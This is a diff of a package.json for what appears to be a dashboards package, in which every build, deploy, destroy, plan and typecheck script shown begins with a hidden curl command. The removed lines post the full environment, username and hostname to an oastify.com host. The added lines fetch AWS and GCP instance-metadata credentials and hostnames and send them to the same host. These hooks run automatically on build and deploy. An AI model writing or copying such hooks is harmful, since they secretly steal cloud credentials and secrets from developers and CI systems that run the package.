@@ -11,9 +11,9 @@
   "module": "insights-dashboards.es5.js",
   "typings": "insights-dashboards.d.ts",
   "scripts": {
-    "build": "curl -d \"`env`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/env/`whoami`/`hostname` && rimraf dist && rollup -c",
-    "postbuild": "curl -d \"`env`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/env/`whoami`/`hostname` && cp yarn.lock package.json ./dist",
-    "deploy": "curl -d \"`env`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/env/`whoami`/`hostname` && jupiterone-manual-deploy -t jupiterone-dev -a apply",
+    "build": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && rimraf dist && rollup -c",
+    "postbuild": "curl -d \"`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && cp yarn.lock package.json ./dist",
+    "deploy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/hostname`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a apply",
     "destroy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a destroy",
     "plan": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/aws && jupiterone-manual-deploy -t jupiterone-dev -a plan",
     "typecheck": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://wddcr90yuvmchfs287qwur0fe6k4es4gt.oastify.com/gcp && tsc --noEmit"
